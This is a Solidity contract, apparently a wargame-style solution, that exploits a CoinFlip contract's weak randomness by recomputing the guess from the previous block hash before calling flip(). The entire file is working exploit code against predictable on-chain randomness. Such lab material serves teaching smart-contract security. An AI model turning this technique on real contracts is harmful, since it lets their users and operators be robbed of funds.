// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    address coinFlipAddress = 0x6664787C85A2777041CD9AA7c79fFbe6Ac05Bee8;
    CoinFlip coinFlipContract = CoinFlip(coinFlipAddress);
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipAttack() external {
        // réplique la logique pour trouver la bonne valeur pour le block actuel
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        // appelle la fonction flip de ton instance du contrat CoinFlip
        coinFlipContract.flip(guess);
    }
}
